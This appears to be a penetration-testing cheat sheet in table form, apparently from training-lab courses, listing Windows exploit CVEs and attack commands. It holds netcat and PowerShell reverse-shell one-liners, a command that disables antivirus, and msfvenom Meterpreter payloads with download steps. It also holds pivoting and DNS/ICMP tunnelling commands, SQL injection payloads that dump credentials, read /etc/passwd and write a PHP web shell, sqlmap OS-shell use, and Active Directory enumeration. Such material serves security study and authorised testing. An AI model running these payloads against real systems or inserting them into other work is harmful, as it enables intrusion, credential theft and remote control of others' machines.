| `[LaZagne](https://github.com/AlessandroZ/LaZagne)` | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |

| `[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)` | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |

| `[Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)` | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |

| `[PCredz](https://github.com/lgandx/PCredz)` | Tool used to tool extract Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface |

| `CVE` | Description |

| `:-----------:` | :--------------------------------------------------------------------------------------------------------------------------- |

| `CVE-2010-0232` | ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit |

| `CVE-2010-2568` | ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload |

| `CVE-2010-2744` | EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation |

| `CVE-2010-3227` | EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution |

| `CVE-2014-4113` | ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution |

| `CVE-2014-4114` | ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution |

| `CVE-2015-0016` | ms15_004_tswbproxy - abuses a process creation policy in Internet Explorer's sandbox - code execution |

| `CVE-2018-8494` | remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input |

| `:-----------:` | ----------------------------------------------------------------------------------------------------------------------------------- |

| `CVE-2013-0008` | ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation |

| `CVE-2013-1300` | ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation |

| `CVE-2013-3660` | ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption |

| `CVE-2013-3918` | ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution |

| `CVE-2013-7331` | ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames |

| `CVE-2014-6324` | ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation |

| `CVE-2014-6332` | ms14_064_ole_code_execution - exploits the Windows OLE Automation array vulnerability |

| `CVE-2014-6352` | ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution |

| `CVE-2015-0002` | ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation |

| `:-----------:` | ------------------------------------------------------------------------------------------------------------------------- |

| `CVE-2015-0057` | exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine |

| `CVE-2015-1769` | MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege |

| `CVE-2015-2426` | ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver |

| `CVE-2015-2479` | MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege |

| `CVE-2015-2513` | MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution |

| `CVE-2015-2423` | MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure |

| `CVE-2015-2431` | MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution |

| `CVE-2015-2441` | MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution |

| `:-----------:` | ---------------------------------------------------------------------------------------------------------- |

| `CVE-2008-4250` | ms08_067_netapi - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX |

| `CVE-2017-8487` | allows an attacker to execute code when a victim opens a specially crafted file - remote code execution |

| `------------` | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

| ``ps`` | Shell Validation From 'ps' |

| ``env`` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |

| `---------------------------------------------------------------------------------------------------` | ------------------------------------------------ |

| ``nc -lvnp 7777`` | Server - Target starting Netcat listener |

| ``nc -nv 10.129.41.200 7777`` | Client - Attack box connecting to target |

| ``rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`` | Server - Binding a Bash shell to the TCP session |

| ``nc -nv 10.129.41.200 7777`` | Client - Connecting to bind shell on target |

| `------------` | ---------------------------------------- |

| ``sudo nc -lvnp 443`` | Server (attack box) |

| ``powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`` | Client (target) -CMD |

| ``Set-MpPreference -DisableRealtimeMonitoring $true`` | Disabling anti virus/ Disabling AV -PWSH |

| ``/bin/sh -i`` | This command will execute the shell interpreter specified in the path in interactive mode (-i). |

| ``perl —e 'exec "/bin/sh";'`` | If the programming language Perl is present on the system, these commands will execute the shell interpreter specified. |

| ``perl: exec "/bin/sh";`` | Perl |

| ``ruby: exec "/bin/sh"`` | If the programming language Ruby is present on the system, this command will execute the shell interpreter specified: |

| ``Lua: os.execute('/bin/sh')`` | If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command |

| ``awk 'BEGIN {system("/bin/sh")}'`` | This is shown in the short awk script, It can also be used to spawn an interactive shell. |

| ``find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`` | find can also be used to execute applications and invoke a shell interpreter. |

| ``find . -exec /bin/sh \; -quit`` | This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained. |

| ``vim -c ':!/bin/sh'`` | We can set the shell interpreter language from within the popular command-line-based text-editor VIM. |

| ``ls -la <path/to/fileorbinary>`` | We can also attempt to run this command to check what sudo permissions the account we landed on has |

| ``sudo -l`` | The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. |

| ``rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc 10.10.14.12 7777 > /tmp/f`` | Netcat/Bash Reverse Shell One-liner |

| ``powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`` | Powershell One-liner |

| `-------------------------------------------------------------------------` | ---------------------------------------------- |

| ``cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx`` | Move a Copy for Modification Laudanum Webshell |

| `---------------------------------------------------------------------------------` | ------------------------------------------- |

| ``cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx`` | Move a Copy for Modification ANTAK WEBSHELL |

| ``ifconfig`` | Linux-based command that displays all current network configurations of a system. |

| ``ipconfig`` | Windows-based command that displays all system network configurations. |

| ``netstat -r`` | Command used to display the routing table for all IPv4-based protocols. |

| ``ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`` | SSH command used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306. |

| ``netstat -antp \| grep 1234`` | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234`. |

| ``ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`` | SSH command that instructs the SSH client to request the SSH server forward all data via port `1234` to `localhost:3306`. |

| ``ssh -D 9050 ubuntu@<IPaddressofTarget>`` | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. |

| ``tail -4 /etc/proxychains.conf`` | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place. |

| ``proxychains msfconsole`` | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy. |

| ``proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`` | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy. |

| ``msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`` | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `LHOST=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`. |

| ``msf6 > use exploit/multi/handler`` | Used to select the multi-handler exploit module in Metasploit. |

| ``scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`` | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`). |

| ``python3 -m http.server 8123`` | Uses Python3 to start a simple HTTP server listening on port `8123`. Can be used to retrieve files from a host. |

| ``Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`` | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`. |

| ``ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target. |

| ``msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost> -f elf -o backupjob LPORT=8080`` | Uses msfvenom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob. |

| ``msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`` | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`). |

| ``for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`` | For Loop used on a Linux-based system to discover devices in a specified network segment. |

| ``for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`` | For Loop used on a Windows-based system to discover devices in a specified network segment. |

| ``1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}`` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. |

| ``msf6 > use auxiliary/server/socks_proxy`` | Metasploit command that selects the `socks_proxy` auxiliary module. |

| ``msf6 auxiliary(server/socks_proxy) > jobs`` | Metasploit command that lists all currently running jobs. |

| ``socks4 127.0.0.1 9050`` | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. |

| ``socks5 127.0.0.1 1080`` | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port. |

| ``msf6 > use post/multi/manage/autoroute`` | Metasploit command used to select the autoroute module. |

| ``meterpreter > help portfwd`` | Meterpreter command used to display the features of the portfwd command. |

| ``meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`` | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. |

| ``xfreerdp /v:localhost:3300 /u:victor /p:pass@123`` | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly. |

| ``netstat -antp`` | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections. `-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection. |

| ``meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`` | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on port 8081 to the port `1234` listening on the IP address of the Attack Host. |

| ``meterpreter > bg`` | Meterpreter-based command used to run the selected Meterpreter session in the background. Similar to background a process in Linux. |

| ``socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`` | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. |

| ``socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`` | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. |

| ``plink -D 9050 ubuntu@<IPaddressofTarget>`` | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |

| ``sudo apt-get install sshuttle`` | Uses apt-get to install the tool sshuttle. |

| ``sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`` | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`). |

| ``sudo git clone https://github.com/klsecservices/rpivot.git`` | Clones the rpivot project GitHub repository. |

| ``sudo apt-get install python2.7`` | Uses apt-get to install python2.7. |

| ``python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`` | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`). |

| ``scp -r rpivot ubuntu@<IPaddressOfTarget>`` | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target. |

| ``python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`` | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port. |

| ``proxychains firefox-esr <IPaddressofTargetWebServer>:80`` | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server. |

| ``python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`` | Used to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. |

| ``netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`` | Windows-based command that uses `netsh.exe` to configure a portproxy rule called `v4tov4` that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. |

| ``netsh.exe interface portproxy show v4tov4`` | Windows-based command used to view the configurations of a portproxy rule called v4tov4. |

| ``git clone https://github.com/iagox86/dnscat2.git`` | Clones the `dnscat2` project GitHub repository. |

| ``sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`` | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled. |

| ``git clone https://github.com/lukebaggett/dnscat2-powershell.git`` | Clones the dnscat2-powershell project GitHub repository. |

| ``Import-Module dnscat2.ps1`` | PowerShell command used to import the dnscat2.ps1 tool. |

| ``Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`` | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`). |

| ``dnscat2> ?`` | Used to list dnscat2 options. |

| ``dnscat2> window -i 1`` | Used to interact with an established dnscat2 session. |

| ``./chisel server -v -p 1234 --socks5`` | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5. |

| ``./chisel client -v 10.129.202.64:1234 socks`` | Used to connect to a chisel server at the specified IP address & port using socks. |

| ``git clone https://github.com/utoni/ptunnel-ng.git`` | Clones the ptunnel-ng project GitHub repository. |

| ``sudo ./autogen.sh`` | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files. |

| ``sudo ./ptunnel-ng -r10.129.202.64 -R22`` | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`). |

| ``sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`` | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`). |

| ``ssh -p2222 -lubuntu 127.0.0.1`` | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. |

| ``regsvr32.exe SocksOverRDP-Plugin.dll`` | Windows-based command used to register the SocksOverRDP-Plugin.dll. |

| ``netstat -antb \| findstr 1080`` | Windows-based command used to list TCP network connections listening on port 1080. |

| ``SELECT * FROM table_name`` | Show all columns in a table |

| ``SELECT column1, column2 FROM table_name`` | Show specific columns in a table |

| ``DROP TABLE logins`` | Delete a table |

| ``ALTER TABLE logins ADD newColumn INT`` | Add new column |

| ``ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`` | Rename column |

| ``ALTER TABLE logins MODIFY oldColumn DATE`` | Change column datatype |

| ``ALTER TABLE logins DROP oldColumn`` | Delete column |

| ``SELECT * FROM logins ORDER BY column_1`` | Sort by column |

| ``SELECT * FROM logins ORDER BY column_1 DESC`` | Sort by column in descending order |

| ``SELECT * FROM logins ORDER BY column_1 DESC, id ASC`` | Sort by two columns |

| ``SELECT * FROM logins LIMIT 2`` | Only show first two results |

| ``SELECT * FROM logins LIMIT 1, 2`` | Only show first two results starting from index 2 |

| ``SELECT * FROM table_name WHERE <condition>`` | List results that meet a condition |

| ``SELECT * FROM logins WHERE username LIKE 'admin%'`` | List results where the name is similar to a given string |

| `**Payload**` | **Description** |

| ``admin' or '1'='1`` | Basic Auth Bypass |

| ``admin')-- -`` | Basic Auth Bypass with comments |

| `[Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)` | More Auth Bypass Payloads |

| ``' order by 1-- -`` | Detect number of columns using `order by` |

| ``cn' UNION select 1,2,3-- -`` | Detect number of columns using Union injection |

| ``cn' UNION select 1,@@version,3,4-- -`` | Basic Union injection |

| ``UNION select username, 2, 3, 4 from passwords-- -`` | Union injection for 4 columns |

| ``SELECT @@version`` | Fingerprint MySQL with query output |

| ``SELECT SLEEP(5)`` | Fingerprint MySQL with no output |

| ``cn' UNION select 1,database(),2,3-- -`` | Current database name |

| ``cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`` | List all databases |

| ``cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`` | List all tables in a specific database |

| ``cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`` | List all columns in a specific table |

| ``cn' UNION select 1, username, password, 4 from dev.credentials-- -`` | Dump data from a table in another database |

| ``cn' UNION SELECT 1, user(), 3, 4-- -`` | Find current user |

| ``cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`` | Find if user has admin privileges |

| ``cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`` | Find all user privileges |

| ``cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`` | Find which directories can be accessed through MySQL |

| ``cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`` | Read local file |

| ``select 'file written successfully!' into outfile '/var/www/html/proof.txt'`` | Write a string to a local file |

| ``cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`` | Write a web shell into the base web directory |

| ``sqlmap -h `` | View the basic help menu |

| ``sqlmap -hh `` | View the advanced help menu |

| ``sqlmap -u "http://www.example.com/vuln.php?id=1" --batch `` | Run SQLMap without asking for user input |

| ``sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`` | SQLMap with POST request |

| ``sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'  `` | POST request specifying an injection point with an asterisk |

| ``sqlmap -r req.txt   `` | Passing an HTTP request file to SQLMap |

| ``sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'    `` | Specifying a cookie header |

| ``sqlmap -u www.target.com --data='id=1' --method PUT    `` | Specifying a PUT request |

| ``sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt   `` | Store traffic to an output file |

| ``sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`` | Specify verbosity level |

| ``sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"   `` | Specifying a prefix or suffix |

| ``sqlmap -u www.example.com/?id=1 -v 3 --level=5   `` | Specifying the level and risk |

| ``sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba    `` | Basic DB enumeration |

| ``sqlmap -u "http://www.example.com/?id=1" --tables -D testdb `` | Table enumeration |

| ``sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname `` | Table/row enumeration |

| ``sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'" `` | Conditional enumeration |

| ``sqlmap -u "http://www.example.com/?id=1" --schema      `` | Database schema enumeration |

| ``sqlmap -u "http://www.example.com/?id=1" --search -T user  `` | Searching for data |

| ``sqlmap -u "http://www.example.com/?id=1" --passwords --batch `` | Password enumeration and cracking |

| ``sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`` | Anti-CSRF token bypass |

| ``sqlmap --list-tampers  `` | List all tamper scripts |

| ``sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba `` | Check for DBA privileges |

| ``sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"   `` | Reading a local file |

| ``sqlmap -u "http://www.example.com/?id=1" --os-shell    `` | Spawning an OS shell |

| ``ffuf -h`` | ffuf help |

| ``ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`` | Directory Fuzzing |

| ``ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`` | Extension Fuzzing |

| ``ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`` | Page Fuzzing |

| ``ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`` | Recursive Fuzzing |

| ``ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`` | Sub-domain Fuzzing |

| ``ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`` | VHost Fuzzing |

| ``ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`` | Parameter Fuzzing - GET |

| ``ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`` | Parameter Fuzzing - POST |

| ``ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`` | Value Fuzzing |

| ``/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`` | Directory/Page Wordlist |

| ``/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`` | Extensions Wordlist |

| ``/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`` | Domain Wordlist |

| ``/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`` | Parameters Wordlist |

| ``sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`` | Add DNS entry |

| ``for i in $(seq 1 1000); do echo $i >> ids.txt; done`` | Create Sequence Wordlist |

| ``curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'`` | curl w/ POST |

| `------------------------------------------------------------` | ------------------------------------------------------------ |

| ``nslookup ns1.inlanefreight.com`` | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |

| ``sudo tcpdump -i ens224`` | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host. |

| ``sudo responder -I ens224 -A`` | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host |

| ``fping -asgq 172.16.5.0/23`` | Performs a ping sweep on the specified network segment from a Linux-based host. |

| ``sudo git clone https://github.com/ropnop/kerbrute.git`` | Uses `git` to clone the kerbrute tool from a Linux-based host. |

| ``make help`` | Used to list compiling options that are possible with `make` from a Linux-based host. |

| ``sudo make all`` | Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures. |

| ``./kerbrute_linux_amd64`` | Used to test the chosen complied `Kebrute` binary from a Linux-based host. |

| ``sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`` | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |

| ``./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |

| ``Get-DomainDNSZone`` | Enumerates the Active Directory DNS zones for a given domain |

| ``Get-DomainDNSRecord`` | Enumerates the Active Directory DNS records for a given zone |

| ``Get-Domain`` | Returns the domain object for the current (or specified) domain |

| ``Get-DomainController`` | Returns the domain controllers for the current (or specified) domain |

| ``Get-Forest`` | Returns the forest object for the current (or specified) forest |

| ``Get-ForestDomain`` | Returns all domains for the current (or specified) forest |

| ``Get-ForestGlobalCatalog`` | Returns all global catalogs for the current (or specified) forest |

| ``Find-DomainObjectPropertyOutlier`` | Finds user/group/computer objects in AD that have 'outlier' properties set |

| ``Get-DomainUser`` | Returns all users or specific user objects in AD |

| ``(Get-DomainUser).count`` | Return count of how many users are in target domain |

| ``Get-DomainUser * -Domain DOMAIN \| Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol \| Export-Csv .\DOMAIN_users.csv -NoTypeInformation`` | Enumerate all domain users and export to CSV |

| ``.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof`` | Obtain list of all users that do not require Kerberos pre-auth for ASREPRoast attack potential |

| ``.\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof`` | Get Kerberos constrained delegation users |

| ``.\SharpView.exe Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"`` | Get users that allow unconstrained delegation |

| ``Get-DomainUser -Properties samaccountname,description \| Where {$_.description -ne $null}`` | Get users where description isn't blank |

| ``.\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname`` | Get Service Principal Names (SPNs) which could be subjected to kerberoasting |

| ``Find-ForeignGroup`` | Enumerate any users from other (foreign) domains with group membership within our domain |

| ``New-DomainUser`` | Creates a new domain user (if permissions allow) and returns the user object |

| ``Set-DomainUserPassword`` | Sets the password for a given user identity |

| ``Get-DomainUserEvent`` | Enumerates account logon events (4624) and logon with explicit credential events |

| ``Get-DomainComputer`` | Returns all computers or specific computer objects in AD |

| ``Get-DomainObject`` | Returns all (or specified) domain objects in AD |

| ``Set-DomainObject`` | Modifies a given property for a specified AD object |

| ``Get-DomainObjectAcl`` | Returns the ACLs associated with a specific AD object |

| ``Add-DomainObjectAcl`` | Adds an ACL for a specific AD object |

| ``Find-InterestingDomainAcl`` | Finds object ACLs with modification rights to non-built-ins |

| ``Get-DomainOU`` | Searches for all or specific organizational units (OUs) in AD |

| ``.\SharpView.exe Get-DomainOU \| findstr /b "name"`` | Return name of all OUs by name field |

| ``Get-DomainSite`` | Searches for all sites or specific site objects in AD |

| ``Get-DomainSubnet`` | Searches for all subnets or specific subnet objects in AD |

| ``Get-DomainSID`` | Returns the SID for the current or specified domain |

| ``Get-DomainGroup`` | Returns all groups or specific group objects in AD |

| ``New-DomainGroup`` | Creates a new domain group (if permissions allow) |

| ``Get-DomainManagedSecurityGroup`` | Returns all security groups in domain with a manager set |

| ``Get-DomainGroupMember`` | Returns the members of a domain group |

| ``Add-DomainGroupMember`` | Adds a user or group to an existing domain group |

